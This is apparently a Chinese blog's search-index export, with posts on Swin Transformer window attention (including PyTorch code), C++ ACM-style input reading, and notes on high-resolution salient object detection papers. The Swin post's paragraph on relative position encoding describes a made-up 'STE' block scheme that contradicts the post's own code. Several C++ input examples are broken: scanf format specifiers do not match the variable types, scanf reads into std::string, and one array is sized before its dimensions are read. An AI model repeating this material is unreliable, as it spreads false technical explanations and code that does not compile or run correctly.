torch.flatten(coords, 1)  # 2, Wh*Ww        relative_coords = coords_flatten[:, :, None] - coords_flatten[:, None, :]  # 2, Wh*Ww, Wh*Ww        relative_coords = relative_coords.permute(1, 2, 0).contiguous()  # Wh*Ww, Wh*Ww, 2        relative_coords[:, :, 0] += self.window_size[0] - 1  # shift to start from 0        relative_coords[:, :, 1] += self.window_size[1] - 1        relative_coords[:, :, 0] *= 2 * self.window_size[1] - 1        relative_position_index = relative_coords.sum(-1)  # Wh*Ww, Wh*Ww        self.register_buffer(&quot;relative_position_index&quot;,relative_position_index)        self.qkv = nn.Linear(dim, dim * 3, bias=qkv_bias)        self.attn_drop = nn.Dropout(attn_drop)        self.proj = nn.Linear(dim, dim)        self.proj_drop = nn.Dropout(proj_drop)        trunc_normal_(self.relative_position_bias_table, std=.02)        self.softmax = nn.Softmax(dim=-1)     # 相关位置编码...    def forward(self, x, mask=None):        &quot;&quot;&quot;        Args:            x: input features with shape of (num_windows*B, N, C)            mask: (0/-inf) mask with shape of (num_windows, Wh*Ww, Wh*Ww) or None        &quot;&quot;&quot;        B_, N, C = x.shape        qkv = self.qkv(x).reshape(B_, N, 3, self.num_heads, C // self.num_heads).permute(2, 0, 3, 1, 4)        q, k, v = qkv[0], qkv[1], qkv[2]  # make torchscript happy (cannot use tensor as tuple)        q = q * self.scale        attn = (q @ k.transpose(-2, -1))        relative_position_bias = self.relative_position_bias_table[self.relative_position_index.view(-1)].view(            self.window_size[0] * self.window_size[1], self.window_size[0] * self.window_size[1], -1)  # Wh*Ww,Wh*Ww,nH        relative_position_bias = relative_position_bias.permute(2, 0, 1).contiguous()  # nH, Wh*Ww, Wh*Ww        attn = attn + relative_position_bias.unsqueeze(0)        if mask is not None:            nW = mask.shape[0]            attn = attn.view(B_ // nW, nW, self.num_heads, N, N) + mask.unsqueeze(1).unsqueeze(0)            attn = attn.view(-1, self.num_heads, N, N)            attn = self.softmax(attn)        else:            attn = self.softmax(attn)        attn = self.attn_drop(attn)        x = (attn @ v).transpose(1, 2).reshape(B_, N, C)        x = self.proj(x)        x = self.proj_drop(x)        return x</code></pre><h3 id="相对位置编码"><a href="#相对位置编码" class="headerlink" title="相对位置编码"></a>相对位置编码</h3><img src="/2023/04/14/swin/3.png">上文公式中的B就是我们这里讲到的相对位置编码矩阵。Swin Transformer中的相对位置编码是通过计算两个位置之间的相对距离来实现的。具体来说，Swin Transformer使用了一种新的相对位置编码方法，称为Swin Transformer Position Encoding（STE）。STE的基本思想是将输入序列划分为多个块，并在每个块中计算相对位置编码。每个块的大小由一个参数P控制，通常设置为16或32。在每个块中，Swin Transformer使用一个可学习的相对位置编码矩阵来计算相对位置编码。具体来说，假设我们有一个输入序列X，其长度为N，块大小为P。我们将输入序列划分为N/P个块，每个块包含P个元素。对于每个块i，Swin Transformer计算相对位置编码矩阵Ri，其大小为P x P。然后，对于块i中的每个元素j，Swin Transformer计算其相对位置编码向量Eij，其大小为1 x P。Eij是通过将元素j与块中所有其他元素的距离作为输入，通过一个前馈神经网络计算得到的。最后，Swin Transformer将每个相对位置编码向量Eij与相对位置编码矩阵Ri相乘，得到最终的相对位置编码向量Pij，其大小为1 x P。Pij表示元素j与块i中所有其他元素之间的相对位置编码。在进行自注意力计算时，Swin Transformer使用Pij来计算每个元素的注意力权重。总之，Swin Transformer中的相对位置编码是通过将输入序列划分为多个块，并在每个块中计算相对位置编码矩阵和相对位置编码向量来实现的。这种方法可以有效地处理较长的序列，并且可以通过学习自适应地计算相对位置编码。<blockquote><p>其中的随机生成的$(2M-1) \times (2M-1)$ 的相对位置偏置是一组可学习的参数</p></blockquote><h3 id="W-MSA"><a href="#W-MSA" class="headerlink" title="W-MSA"></a>W-MSA</h3><p>W-MSA:Windows Multi-head Self-Attention多头窗口自注意力<br>目的：减少计算量<br><img src="/2023/04/14/swin/2.jpg"><br>对于普通的MSA模块，feature map中的每个像素与class序列在Self-attention计算过程中需要和所有的像素去计算全局，但是使用W-MSA时，将会将feature map拆分为一个个不重叠的window，比如是$M\times M$大小的windows，然后单独对每个windows内部进行Self-Attention。假设在Swin transformer中输入$224\times224\times3$的图片，那么一个patch的大小划分为$4\times4$，那么就有$56\times56$个patch，而每7个patch就组成一个窗口，也就是一个窗口有$7\times7$个patch，一个$224\times224\times3$的图片会有$8\times 8&#x3D;64$个窗口。论文中给出的具体计算公式为：<br>$$\Large \Omega(MSA)&#x3D;4hwC^2+2(hw)^2C$$</p><p>$$\Large \Omega(W-MSA)&#x3D;4hwC^2+2M^2hwC$$</p><blockquote><p>h代表feature map的高度<br>w代表feature map的宽度<br>C代表feature map的深度</p></blockquote><p>不难发现其中变化的就是将原有的feature map全部遍历所带来的复杂度$(hw)^2$变成了遍历$M\times M$的Windows复杂度$M^2hw$。看似差别不大，但是实际上差了几十倍甚至上百倍。</p><h3 id="SW-MSA"><a href="#SW-MSA" class="headerlink" title="SW-MSA"></a>SW-MSA</h3><p>当只有W-MSA时，只会有每个窗口内部进行Self-Attention,窗口之间是无法实现信息的传递的。为了实现窗口之间高效的相互交互，作者提出了Shifted Windows Multi-Head Self-Attention（SW-MSA）模块<br><img src="/2023/04/14/swin/shitf_window.PNG"><br><img src="/2023/04/14/swin/shitf.PNG"></p><p>其中layer1表示原本的分块，然后将窗口向右下角滑动一个$2\times2$的位置得到layer2，然后再进行Attention操作，但是直接这样处理会带来一个问题就是当原本不在一起的图像块也会进行attention操作，这是不合理的，这时候我们就需要想办法让其能知道，当shift之后，哪些块原本是相邻的，哪些是原本不相邻的。这时候引入下图所示的mask机制，<br><img src="/2023/04/14/swin/mask.png"><br>使用矩阵的方式将不相邻的块变为图像中的紫色，置位负无穷大，使得在进行softmax时可以将其变为0，也就相当于是没有进行attention操作。</p><p>此时一个基础的SwinTransformerBlock就构建完毕了。</p><pre><code class="python">class SwinTransformerBlock(nn.Module):    r&quot;&quot;&quot; Swin Transformer Block.    Args:        dim (int): Number of input channels.        input_resolution (tuple[int]): Input resulotion.        num_heads (int): Number of attention heads.        window_size (int): Window size.        shift_size (int): Shift size for SW-MSA.        mlp_ratio (float): Ratio of mlp hidden dim to embedding dim.        qkv_bias (bool, optional): If True, add a learnable bias to query, key, value. Default: True        qk_scale (float | None, optional): Override default qk scale of head_dim ** -0.5 if set.        drop (float, optional): Dropout rate. Default: 0.0        attn_drop (float, optional): Attention dropout rate. Default: 0.0        drop_path (float, optional): Stochastic depth rate. Default: 0.0        act_layer (nn.Module, optional): Activation layer. Default: nn.GELU        norm_layer (nn.Module, optional): Normalization layer.  Default: nn.LayerNorm        fused_window_process (bool, optional): If True, use one kernel to fused window shift &amp; window partition for acceleration, similar for the reversed part. Default: False    &quot;&quot;&quot;    def __init__(self, dim, input_resolution, num_heads, window_size=7, shift_size=0,                 mlp_ratio=4., qkv_bias=True, qk_scale=None, drop=0., attn_drop=0., drop_path=0.,                 act_layer=nn.GELU, norm_layer=nn.LayerNorm,                 fused_window_process=False):        super().__init__()        self.dim = dim        self.input_resolution = input_resolution        self.num_heads = num_heads        self.window_size = window_size        self.shift_size = shift_size        self.mlp_ratio = mlp_ratio        if min(self.input_resolution) &lt;= self.window_size:            # if window size is larger than input resolution, we don&#39;t partition windows            self.shift_size = 0            self.window_size = min(self.input_resolution)        assert 0 &lt;= self.shift_size &lt; self.window_size, &quot;shift_size must in 0-window_size&quot;        self.norm1 = norm_layer(dim)        self.attn = WindowAttention(            dim, window_size=to_2tuple(self.window_size), num_heads=num_heads,            qkv_bias=qkv_bias, qk_scale=qk_scale, attn_drop=attn_drop, proj_drop=drop)        self.drop_path = DropPath(drop_path) if drop_path &gt; 0. else nn.Identity()        self.norm2 = norm_layer(dim)        mlp_hidden_dim = int(dim * mlp_ratio)        self.mlp = Mlp(in_features=dim, hidden_features=mlp_hidden_dim, act_layer=act_layer, drop=drop)        if self.shift_size &gt; 0:            # calculate attention mask for SW-MSA            H, W = self.input_resolution            img_mask = torch.zeros((1, H, W, 1))  # 1 H W 1            h_slices = (slice(0, -self.window_size),                        slice(-self.window_size, -self.shift_size),                        slice(-self.shift_size, None))            w_slices = (slice(0, -self.window_size),                        slice(-self.window_size, -self.shift_size),                        slice(-self.shift_size, None))            cnt = 0            for h in h_slices:                for w in w_slices:                    img_mask[:, h, w, :] = cnt                    cnt += 1            mask_windows = window_partition(img_mask, self.window_size)  # nW, window_size, window_size, 1            mask_windows = mask_windows.view(-1, self.window_size * self.window_size)            attn_mask = mask_windows.unsqueeze(1) - mask_windows.unsqueeze(2)            attn_mask = attn_mask.masked_fill(attn_mask != 0, float(-100.0)).masked_fill(attn_mask == 0, float(0.0))        else:            attn_mask = None        self.register_buffer(&quot;attn_mask&quot;, attn_mask)        self.fused_window_process = fused_window_process    def forward(self, x):        H, W = self.input_resolution        B, L, C = x.shape        assert L == H * W, &quot;input feature has wrong size&quot;        shortcut = x        x = self.norm1(x)        x = x.view(B, H, W, C)        # cyclic shift        if self.shift_size &gt; 0:            if not self.fused_window_process:                shifted_x = torch.roll(x, shifts=(-self.shift_size, -self.shift_size), dims=(1, 2))                # partition windows                x_windows = window_partition(shifted_x, self.window_size)  # nW*B, window_size, window_size, C            else:                x_windows = WindowProcess.apply(x, B, H, W, C, -self.shift_size, self.window_size)        else:            shifted_x = x            # partition windows            x_windows = window_partition(shifted_x, self.window_size)  # nW*B, window_size, window_size, C        x_windows = x_windows.view(-1, self.window_size * self.window_size, C)  # nW*B, window_size*window_size, C        # W-MSA/SW-MSA        attn_windows = self.attn(x_windows, mask=self.attn_mask)  # nW*B, window_size*window_size, C        # merge windows        attn_windows = attn_windows.view(-1, self.window_size, self.window_size, C)        # reverse cyclic shift        if self.shift_size &gt; 0:            if not self.fused_window_process:                shifted_x = window_reverse(attn_windows, self.window_size, H, W)  # B H&#39; W&#39; C                x = torch.roll(shifted_x, shifts=(self.shift_size, self.shift_size), dims=(1, 2))            else:                x = WindowProcessReverse.apply(attn_windows, B, H, W, C, self.shift_size, self.window_size)        else:            shifted_x = window_reverse(attn_windows, self.window_size, H, W)  # B H&#39; W&#39; C            x = shifted_x        x = x.view(B, H * W, C)        x = shortcut + self.drop_path(x)        # FFN        x = x + self.drop_path(self.mlp(self.norm2(x)))        return x</code></pre><p>最后就是按架构图所设计的将四个block给堆叠起来得到完整的swin-transformer。</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 深度学习 </tag>
            
            <tag> Transformer </tag>
            
            <tag> Segmentation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM格式输入（一）</title>
      <link href="/2023/04/13/ACM%E6%A0%BC%E5%BC%8F%E8%BE%93%E5%85%A5/"/>
      <url>/2023/04/13/ACM%E6%A0%BC%E5%BC%8F%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="c-常用的输入输出方法"><a href="#c-常用的输入输出方法" class="headerlink" title="c++常用的输入输出方法"></a>c++常用的输入输出方法</h1><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>1.cin</p><blockquote><p>注意1：cin可以连续从键盘读入数据<br>注意2：cin以空格、tab、换行符作为分隔符<br>注意3：cin从第一个非空格字符开始读取，直到遇到分隔符结束读取</p></blockquote><pre><code class="cpp">// 用法1，读入单数据int num;cin &gt;&gt; num;cout &lt;&lt; num &lt;&lt; endl;  // 输出读入的整数num// 用法2，批量读入多个数据vector&lt;int&gt; nums(5);for(int i = 0; i &lt; nums.size(); i++) &#123;    cin &gt;&gt; nums[i];&#125;// 输出读入的数组for(int i = 0; i &lt; nums.size(); i++) &#123;    cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;;&#125;</code></pre><p>2.getline()</p><blockquote><p>当读取的字符串中间存在空格时，cin就不可用了，便可以使用getline()</p></blockquote><pre><code class="cpp">string s;getline(cin, s);// 输出读入的字符串cout &lt;&lt; s &lt;&lt; endl;</code></pre><p>3.getchar</p><pre><code class="cpp">char ch;ch = getchar();// 输出读入的字符cout &lt;&lt; ch &lt;&lt; endl;</code></pre><p>4.scanf()</p><blockquote><p>使用最多的输入方式</p></blockquote><pre><code class="cpp">//1.输入十进制的数 int a;scanf(&quot;%d&quot;,&amp;a);scanf(&quot;%i&quot;,&amp;a);scanf(&quot;%u&quot;,&amp;a);//这三种写法都是可以的 //2.输入八进制和十六进制数 int b;scanf(&quot;%o&quot;,&amp;b); //八进制 scanf(&quot;%x&quot;,&amp;b); //十六进制 //3.输入实数int c;scanf(&quot;%f&quot;,&amp;c);scanf(&quot;%e&quot;,&amp;c);//这两种写法可以互换 //4.输入字符和字符串 char d;string dd;scanf(&quot;%c&quot;,&amp;d); //单个字符 scanf(&quot;%s&quot;,&amp;dd); //字符串 //5.跳过一次输入 int e;scanf(&quot;%*&quot;,&amp;e);//6.输入长整型数 int f;scanf(&quot;%ld&quot;,&amp;f);scanf(&quot;%lo&quot;,&amp;f);scanf(&quot;%lx&quot;,&amp;f);scanf(&quot;%l&quot;,&amp;f);//四种写法都可以用 //7.输入短整型数 int g;scanf(&quot;%hd&quot;,&amp;g);scanf(&quot;%ho&quot;,&amp;g);scanf(&quot;%hx&quot;,&amp;g);scanf(&quot;%h&quot;,&amp;g);//四种写法都可以用 //8.输入double型数（小数 double h;scanf(&quot;%lf&quot;,&amp;h);scanf(&quot;%lf&quot;,&amp;h);scanf(&quot;%l&quot;,&amp;h);//三种写法都可以用 //9.域宽的使用 int i;scanf(&quot;%5d&quot;,&amp;i);//10.特殊占位符 int j,k;scanf(&quot;%d,%d&quot;,&amp;j,&amp;k);int j,k;scanf(&quot;%d&quot;,&amp;j);printf(&quot;,&quot;); //cout&lt;&lt;&quot;,&quot;;scanf(&quot;%d&quot;,&amp;k);</code></pre><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>cout，printf随意搭配，就不讲了</p><p>下面将一些输入格式</p><pre><code class="cpp">#include&lt;iostream&gt;#include&lt;sstream&gt;#include&lt;string&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;limits.h&gt;  //INT_MIN 和 INT_MAX的头文件  using namespace std;struct stu &#123;    string name;    int num;&#125;;// 1. 直接输入一个数int main() &#123;    int n = 0;    while (cin &gt;&gt; n) &#123;         cout &lt;&lt; n &lt;&lt; endl;    &#125;    return -1;&#125;// 2. 直接输入一个字符串int main() &#123;    string str;    while (cin &gt;&gt; str) &#123;        cout &lt;&lt; str &lt;&lt; endl;    &#125;    return -1;&#125;// 3. 只读取一个字符 int main() &#123;    char ch;    //方式1    while (cin &gt;&gt; ch) &#123;        cout &lt;&lt; ch &lt;&lt; endl;    &#125;    //方式2： cin.get(ch) 或者 ch = cin.get() 或者 cin.get()    while (cin.get(ch)) &#123;           cout &lt;&lt; ch &lt;&lt; endl;    &#125;    //方式3 ：ch = getchar()      while (getchar()) &#123;        cout &lt;&lt; ch &lt;&lt; endl;    &#125;    return -1;&#125;// 3.1给定一个数，表示有多少组数（可能是数字和字符串的组合），然后读取int main() &#123;    int n = 0;     while (cin &gt;&gt; n) &#123;   //每次读取1 + n 个数，即一个样例有n+1个数         vector&lt;int&gt; nums(n);        for (int i = 0; i &lt; n; i++) &#123;            cin &gt;&gt; nums[i];        &#125;        //处理这组数/字符串        for (int i = 0; i &lt; n; i++) &#123;            cout &lt;&lt; nums[i] &lt;&lt; endl;        &#125;    &#125;    return -1;&#125;//3.2 首先给一个数字，表示需读取n个字符，然后顺序读取n个字符int main() &#123;    int n = 0;    while (cin &gt;&gt; n) &#123;  //输入数量        vector&lt;string&gt; strs;        for (int i = 0; i &lt; n; i++) &#123;            string temp;            cin &gt;&gt; temp;            strs.push_back(temp);        &#125;        //处理这组字符串        sort(strs.begin(), strs.end());        for (auto&amp; str : strs) &#123;            cout &lt;&lt; str &lt;&lt; &#39; &#39;;        &#125;    &#125;    return 0;&#125;//4.未给定数据个数，但是每一行代表一组数据，每个数据之间用空格隔开//4.1使用getchar() 或者 cin.get() 读取判断是否是换行符，若是的话，则表示该组数（样例）结束了，需进行处理int main() &#123;    int ele;    while (cin &gt;&gt; ele) &#123;        int sum = ele;        // getchar()   //读取单个字符        /*while (cin.get() != &#39;\n&#39;) &#123;*/   //判断换行符号        while (getchar() != &#39;\n&#39;) &#123;  //如果不是换行符号的话，读到的是数字后面的空格或者table            int num;            cin &gt;&gt; num;            sum += num;        &#125;        cout &lt;&lt; sum &lt;&lt; endl;    &#125;    return 0;&#125;//4.2 给定一行字符串，每个字符串用空格间隔，一个样例为一行int main() &#123;    string str;    vector&lt;string&gt; strs;    while (cin &gt;&gt; str) &#123;        strs.push_back(str);        if (getchar() == &#39;\n&#39;) &#123;  //控制测试样例            sort(strs.begin(), strs.end());            for (auto&amp; str : strs) &#123;                cout &lt;&lt; str &lt;&lt; &quot; &quot;;            &#125;            cout &lt;&lt; endl;            strs.clear();        &#125;    &#125;    return 0;&#125;//4.3 使用getline 读取一整行数字到字符串input中，然后使用字符串流stringstream，读取单个数字或者字符。int main() &#123;    string input;    while (getline(cin, input)) &#123;  //读取一行        stringstream data(input);  //使用字符串流        int num = 0, sum = 0;        while (data &gt;&gt; num) &#123;            sum += num;        &#125;        cout &lt;&lt; sum &lt;&lt; endl;    &#125;    return 0;&#125;//4.4 使用getline 读取一整行字符串到字符串input中，然后使用字符串流stringstream，读取单个数字或者字符。int main() &#123;    string words;    while (getline(cin, words)) &#123;        stringstream data(words);        vector&lt;string&gt; strs;        string str;        while (data &gt;&gt; str) &#123;            strs.push_back(str);        &#125;        sort(strs.begin(), strs.end());        for (auto&amp; str : strs) &#123;            cout &lt;&lt; str &lt;&lt; &quot; &quot;;        &#125;    &#125;&#125;//4.5 使用getline 读取一整行字符串到字符串input中，然后使用字符串流stringstream，读取单个数字或者字符。每个字符中间用&#39;,&#39;间隔int main() &#123;    string line;        //while (cin &gt;&gt; line) &#123;  //因为加了“，”所以可以看出一个字符串读取    while(getline(cin, line))&#123;        vector&lt;string&gt; strs;        stringstream ss(line);        string str;        while (getline(ss, str, &#39;,&#39;)) &#123;            strs.push_back(str);        &#125;        //        sort(strs.begin(), strs.end());        for (auto&amp; str : strs) &#123;            cout &lt;&lt; str &lt;&lt; &quot; &quot;;        &#125;        cout &lt;&lt; endl;    &#125;    return 0;&#125;int main() &#123;    string str;        //C语言读取字符、数字    int a;    char c;    string s;    scanf_s(&quot;%d&quot;, &amp;a);    scanf(&quot;%c&quot;, &amp;c);    scanf(&quot;%s&quot;, &amp;s);    printf(&quot;%d&quot;, a);    //读取字符    char ch;    cin &gt;&gt; ch;    ch = getchar();    while (cin.get(ch)) &#123; //获得单个字符        ;    &#125;        //读取字符串    cin &gt;&gt; str;  //遇到空白停止    getline(cin, str);  //读入一行字符串&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ACM </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM格式输入（二）</title>
      <link href="/2023/04/13/ACM%E6%A0%BC%E5%BC%8F%E8%BE%93%E5%85%A52/"/>
      <url>/2023/04/13/ACM%E6%A0%BC%E5%BC%8F%E8%BE%93%E5%85%A52/</url>
      
        <content type="html"><![CDATA[<h1 id="c-常用的输入输出方法"><a href="#c-常用的输入输出方法" class="headerlink" title="c++常用的输入输出方法"></a>c++常用的输入输出方法</h1><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>一维数组：</p><blockquote><p>输入包含一个整数n代表数组长度。<br>接下来包含n个整数，代表数组中的元素<br>3<br>1 2 3</p></blockquote><pre><code class="cpp">int n;scanf(&quot;%d&quot;,&amp;n); // 读入3，说明数组的大小是3vector&lt;int&gt; nums(n); // 创建大小为3的vector&lt;int&gt;for(int i = 0; i &lt; n; i++) &#123;    cin &gt;&gt; nums[i];&#125;// 验证是否读入成功for(int i = 0; i &lt; nums.size(); i++) &#123;    cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;;&#125;cout &lt;&lt; endl;</code></pre><p>若是不限定输入数据的大小</p><pre><code class="cpp">vector&lt;int&gt; nums;int num;while(cin &gt;&gt; num) &#123;    nums.push_back(num);    // 读到换行符，终止循环    if(getchar() == &#39;\n&#39;) &#123;        break;    &#125;&#125;// 验证是否读入成功for(int i = 0; i &lt; nums.size(); i++) &#123;    cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;;&#125;cout &lt;&lt; endl;</code></pre><h3 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h3><p>例如</p><blockquote><p>输出N行，每行M个空格分隔的整数。每个整数表示该位置距离最近的水域的距离。<br>4 4<br>0110<br>1111<br>1111<br>0110</p></blockquote><pre><code class="cpp">int n,m;int res[n][m];//vector&lt;vector&lt;int&gt;&gt;res(n,vector&lt;int&gt;(n));scanf(&quot;%d%d&quot;,&amp;n,&amp;m);for(int i=0;i&lt;n;i++)&#123;    for(int j=0;j&lt;m;j++)&#123;        scanf(&quot;%d&quot;,&amp;res[i][j]);    &#125;&#125;// 验证是否读入成功for(int i = 0; i &lt; m; i++) &#123;    for(int j = 0; j &lt; n; j++) &#123;        cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;;    &#125;    cout &lt;&lt; endl;</code></pre><p>再附加每行数据用特殊字符给隔开的限制</p><pre><code class="cpp">int m; // 接收行数int n; // 接收列数cin &gt;&gt; m &gt;&gt; n;vector&lt;vector&lt;int&gt;&gt; matrix(m);for(int i = 0; i &lt; m; i++) &#123;    // 读入字符串    string s;    getline(cin, s);        // 将读入的字符串按照逗号分隔为vector&lt;int&gt;    vector&lt;int&gt; vec;    int p = 0;    for(int q = 0; q &lt; s.size(); q++) &#123;        p = q;        while(s[p] != &#39;,&#39; &amp;&amp; p &lt; s.size()) &#123;            p++;        &#125;        string tmp = s.substr(q, p - q);        vec.push_back(stoi(tmp));        q = p;    &#125;        //写入matrix    matrix[i] = vec;    vec.clear();&#125;// 验证是否读入成功for(int i = 0; i &lt; matrix.size(); i++) &#123;    for(int j = 0; j &lt; matrix[i].size(); j++) &#123;        cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;;    &#125;    cout &lt;&lt; endl;&#125;</code></pre><p>结构体输入：</p><blockquote><p>第 1 行：正整数 n<br>第 2 行：第 1 个学生的姓名 学号 成绩<br>第 3 行：第 2 个学生的姓名 学号 成绩<br> … … …<br>第 n+1 行：第 n 个学生的姓名 学号 成绩</p></blockquote><blockquote><p>3<br>Joe Math990112 89<br>Mike CS991301 100<br>Mary EE990830 95</p></blockquote><pre><code class="cpp">struct Student&#123;  char name[11];  char subject[11];  int score;&#125;;int main()&#123;    int n;    scanf(&quot;%d&quot;,&amp;n);    Student* s = new Student[n];    for(int i=0;i&lt;n;i++)&#123;         cin&gt;&gt;s[i].name&gt;&gt;s[i].subject&gt;&gt;s[i].score;    &#125;    return 0;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> ACM </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Looking for the Detail and Context Devils:High-Resolution Salient Object Detection</title>
      <link href="/2023/04/11/Looking%20for%20the%20Detail%20and%20Context%20Devils/"/>
      <url>/2023/04/11/Looking%20for%20the%20Detail%20and%20Context%20Devils/</url>
      
        <content type="html"><![CDATA[<h1 id="Looking-for-the-Detail-and-Context-Devils-High-Resolution-Salient-Object-Detection"><a href="#Looking-for-the-Detail-and-Context-Devils-High-Resolution-Salient-Object-Detection" class="headerlink" title="Looking for the Detail and Context Devils:High-Resolution Salient Object Detection "></a><center>Looking for the Detail and Context Devils:High-Resolution Salient Object Detection </center></h1><p>缺乏显著对象的边界细节和语义上下文是低分辨率SOD数据集的一大弊端，本文设计了一个端到端的学习框架，称为DRFNet,使用一个共享特征提取器和两个有效的细化头构成。通过解耦细节和上下文信息，一个细化头采用全局感知和特征金字塔，在不增加太多计算负担的情况下，提升空间细节信息，从而缩小高级语义和低级细节之间的差距，另一个细化头采用混合扩张卷积块和分组上采样，这在提取上下文信息方面非常有效，基于双重细化，使得实现扩大感受野并从高分辨率图像中获取更多的判别特征。</p><p>高分辨率图像具有一个突出的特点包含更多可以覆盖范围和形状的结构对象和更多的细节信息。一方面高级上下文特征更适合检测大而混乱的对象，而小对象则受益于低级精细特征。不同层次特征的结合将为语义定位和细节增强提供更丰富的信息。</p><p>现有的基于FCN结构的方法一个缺点就是特征通常是以粗到精细的方式集成，它缺乏获取足够的局部和全局上下文信息或远程依赖关系的能力。导致不显眼的对象和混淆区域的准确性较差。大量的使用卷积操作使得对于算力和内存的要求变得极高，但如果将输入图像限制为相对较低的分辨率，又阻碍了细节感知和高分辨的实际需求。</p><p>现有的高分辨率图像像素级标记方法大致分为三大类，</p><blockquote><ul><li>1首先将高分辨率图像裁剪为低分辨图像，然后预测低分辨率结果并将其结果插值为原始图像大小。这种操作虽然简单但是图像空间细节的丢失是不可避免，导致出现对物体边界的错误预测</li><li>2设计轻型编码器-解码器网络,通过特征融合层次特征，之间提高空间分辨率并恢复一些缺少的细节，但是这种由于连续的下采样操作会带来空间信息的丢失且缺乏足够的对象的感受野</li><li>3 引入具有多个分支的不对称网络,每个分支以不同分辨率运行，即低分辨率图像中提取全局信息，高分辨率图像中提取精细细节，但是如何在不同分支上整合全局和局部信息还没一个很好的方法，由于高级语义和低级细节之间的差距，不好的融合方式可能使得它们在预测中出现奇怪的预测区域</li></ul></blockquote><h3 id="常见的HRSOD网络架构"><a href="#常见的HRSOD网络架构" class="headerlink" title="常见的HRSOD网络架构"></a><center>常见的HRSOD网络架构</center></h3><div align="center"><img src="/2023/04/11/Looking%20for%20the%20Detail%20and%20Context%20Devils/三种常用的HR网络架构.PNG"></div><h3 id="本文网络结构"><a href="#本文网络结构" class="headerlink" title="本文网络结构"></a><center>本文网络结构</center></h3><div align="center"><img src="/2023/04/11/Looking%20for%20the%20Detail%20and%20Context%20Devils/DRFNet.PNG"></div><h3 id="共享特征提取器"><a href="#共享特征提取器" class="headerlink" title="共享特征提取器"></a>共享特征提取器</h3><p>采用修改后的VGG-16和ResNet-18作为共享特征提取器</p><h3 id="Detail-Refinement-Head"><a href="#Detail-Refinement-Head" class="headerlink" title="Detail Refinement Head"></a>Detail Refinement Head</h3><p>DRH包括三个关键块：</p><blockquote><ul><li>1卷积特征缩减块(CFRB):该块旨在缩小多尺度深度特征的维数，本质上就是一个$1\times1$的卷积块，后面是批归一化和Relu激活函数，为减少高分辨率图像的计算和内存需求，卷积滤波器的数量设为为32</li><li>2深度特征上采样块(DFUB):采用C组的反卷积进行上采样，通过适当的上采样率，可以放大较深层的输出特征以匹配较浅层产生的特征，且进一步减少计算量</li><li>3全局感知特征交互块(GFIB)：由于接受域有限，无法获取足够的全局信息，为表达增强表现能力，首先对CFRB和DFUB的特征进行级联全局平均池化。然后将其转发到全连接层以生成全局权重向量,整个过程可以表示为<br>$$\Large \alpha_G &#x3D; \sigma(W_1<em>GAP([F_C,F_D])+b)$$<br>$$\Large F_R&#x3D;g(W_2</em>[F_C,F_D]+b)$$<br>$$\Large F_G &#x3D; \alpha_G\odot F_R$$</li></ul></blockquote><h3 id="Context-Refinement-Head"><a href="#Context-Refinement-Head" class="headerlink" title="Context Refinement Head"></a>Context Refinement Head</h3><p>在直接堆叠或使用金字塔结构扩大感受野的策略中具有两个非常明显的缺点。1：计算量大，占用内存，不适合高分辨率图像。2：缺乏捕获足够多尺度局部上下文信息的能力，导致对于不显眼的对象的准确性较差本文提出的CRH使用混合膨胀卷积和分组上采样组成。具体的来说就是使用一个混合扩张卷积块和一个分组上采样组成</p>]]></content>
      
      
      <categories>
          
          <category> SOD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SOD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Disentangled High Quality Salient Object Detection</title>
      <link href="/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/"/>
      <url>/2023/04/11/Disentangled%20High%20Quality%20Salient%20Object%20Detection/</url>
      
        <content type="html"><![CDATA[<h1 id="Disentangled-High-Quality-Salient-Object-Detection"><a href="#Disentangled-High-Quality-Salient-Object-Detection" class="headerlink" title="Disentangled High Quality Salient Object Detection"></a><center>Disentangled High Quality Salient Object Detection</center></h1><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>将高分辨率SOD任务分解为低分辨率显著性分类网络(LRSCN)和高分辨细化网络(HRRN),作为一项逐像素分类任务，LRSCN旨在以低分辨率来捕获足够的语义，以识别明确的显著，背景和不确定区域。HRRN是一项回归任务，旨在准确提炼不明确区域中的像素的显著性值。</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>一种好的高分辨率显著目标检测方法不仅要准确地检测出整个显著目标，还要预测显著目标的精确边界。基于低分辨率设计的SOD模型无法直接套用到高分辨率图像中，最主要的原因就是，低分辨的方法往往是将识别和定位两个过程使用一个过程实现，而对于高分辨率图像最为重要的是对于边界的精确分割。对于显著区域的定位我们可以通过扩大感受野来获取足够的语义，但是由于高分辨的特性，这将使得内存的使用大大的增加，此时往往采用下采样操作，但是下采样操作不可避免地会使得结构信息丢失。这种解决问题的思路也就是导致低分辨的SOD模型直接迁移至高分辨率图像中会出现边界模糊的原因。如下图所示</p><h3 id="模型结果对比"><a href="#模型结果对比" class="headerlink" title="模型结果对比"></a><center>模型结果对比</center></h3><div align="center"><img 